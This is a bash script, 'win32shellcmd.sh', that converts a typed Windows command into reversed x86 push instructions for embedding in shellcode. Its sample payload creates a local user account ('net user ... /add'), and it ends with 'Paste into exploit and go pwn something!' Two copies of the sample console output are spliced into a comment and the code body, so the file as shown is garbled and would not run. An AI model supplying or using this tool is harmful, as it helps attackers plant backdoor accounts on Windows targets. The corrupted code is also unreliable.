#!/bin/bash
# 
# win32shellcmd.sh
#
# so we correctly enter a command and have it become proper shellcode
#
# Sample follows
#[-] Welcome to my shellcoding script 
#
#[-] This will create a series of push commands for your windows targets
#
#[-] Enter your command 
#cmd.exe /c net user sheldon bazinga /add
#
#[-] Checking if it is divisble by four
#[-] Command has 40 characters!
#[-] This command can be used, proceeding ....
#
#[-] converting to hex
#
#push 0x2f616464
#push 0x6e676120
#push 0x62617a69
#push 0x646f6e20
#push 0x7368656c
#push 0x73657220
#push 0x65742075
#push 0x2f63206e
#push 0x65786520
#push 0x636d642e
#[-] Paste into exploit and go pwn something!

clear
echo "[-] Welcome to my shellcoding script "
echo
echo "[-] This will create a series of push commands for your windows targets"
echo
divby4="no"
while [ $divby4 = no ]
do
	echo "[-] Enter your command "
	read injectcommand
	#
	# First thing we are going to do is check for the right amount of characters
	# Place in tmp file, and use sed to remove the CR (0a)
	#
	echo $injectcommand > /tmp/injector.txt
	#sed -i 's/.$//' /tmp/injector.txt
	#
	echo
	echo "[-] Checking if it is divisble by four"
	#
	# This is convoluded. The act of entering the command in the shellscript adds an artifical 0a. It messes EVERYTHING up. 
	# Which is precisely why this script[-] Welcome to my shellcoding script 

[-] This will create a series of push commands for your windows targets

[-] Enter your command 
cmd.exe /c net user sheldon bazinga /add

[-] Checking if it is divisble by four
[-] Command has 40 characters!
[-] This command can be used, proceeding ....

[-] converting to hex

push 0x2f616464
push 0x6e676120
push 0x62617a69
push 0x646f6e20
push 0x7368656c
push 0x73657220
push 0x65742075
push 0x2f63206e
push 0x65786520
push 0x636d642e
[-] Paste into exploit and go pwn something! exists.
	# However if we change the file permanently with sed -i, the last character disappears
	# The solution, temporary sed, just to count the characters
	# Verified pwd = 3 and ipconfig=8
	charcounter=$(cat /tmp/injector.txt | sed 's/.$//' | wc -c | cut -d' ' -f1)
[-] Welcome to my shellcoding script 

[-] This will create a series of push commands for your windows targets

[-] Enter your command 
cmd.exe /c net user sheldon bazinga /add

[-] Checking if it is divisble by four
[-] Command has 40 characters!
[-] This command can be used, proceeding ....

[-] converting to hex

push 0x2f616464
push 0x6e676120
push 0x62617a69
push 0x646f6e20
push 0x7368656c
push 0x73657220
push 0x65742075
push 0x2f63206e
push 0x65786520
push 0x636d642e
[-] Paste into exploit and go pwn something!	echo -n "[-] Command has " && echo -n $charcounter && echo " characters!"
	#exit
	if (( $charcounter % 4 == 0 ))
	then
		# We have the proper number of characters
		echo "[-] This command can be used, proceeding ...."
		divby4="yes"
		sleep 2
	else
		# The command is not divisible by four
		# Provide error message and continue in while do done
		echo "[-] Unfortunately, your command is not divisible by four"
		echo "[-] Consider adding a space to the end, our if able tweak the filename to obtain a character set that is divisible by 4"
	fi
done 
echo
echo "[-] converting to hex"
# The tailing 0x0a continues to be a problem. Further, I have to use translate to remove any returns and keep each line at four hex bytes.
# So, since we have the flexibility of a variable AND a file, I just kept messing with it 
# Until it worked.
echo $injectcommand | xxd -ps | tr -d '\n' | fold -w8 | sed 's/^/push 0x/' | sed 's/push 0x0a//' > /tmp/pasteme.txt
echo
tac /tmp/pasteme.txt
echo "[-] Paste into exploit and go pwn something!"
rm /tmp/injector.txt 2>/dev/null
rm /tmp/pasteme.txt  2>/dev/null
exit

